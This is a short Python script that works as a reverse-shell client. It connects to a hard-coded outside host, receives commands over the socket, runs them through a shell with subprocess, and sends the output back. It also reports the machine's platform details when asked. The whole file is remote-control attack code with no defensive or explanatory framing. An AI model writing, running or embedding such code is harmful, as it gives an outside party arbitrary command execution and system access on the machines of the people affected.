import socket
import subprocess
import os
import sys
import platform

global y
y = socket.socket()
y.connect(("1.1.1.1", 0))
while True:
	recieved = ((y.recv(1024)).decode('utf-8'))
	print(recieved)
	if len(recieved) > 0:
		if(recieved) == 'platform':
			recieved = ((y.recv(1024)).decode('utf-8'))
			if(recieved) == 'uname':				
				string = str(platform.uname())
				byte = bytes(string, 'utf-8')
				y.send(byte)
		elif (recieved) == 'cmd':
			recieved = (y.recv(1024).decode('utf-8'))
			if len(recieved) > 0:
				print(recieved)
				if recieved[:5] == 'mkdir':
					cmd = subprocess.Popen(recieved, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					y.send(("Made Directory").encode('utf-8'))

				else:
					cmd = subprocess.Popen(recieved, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					out_string = cmd.stdout.read()
					y.send(out_string)
		elif (recieved) == 'terminate':
			y.close()
		else:
			print("No platform")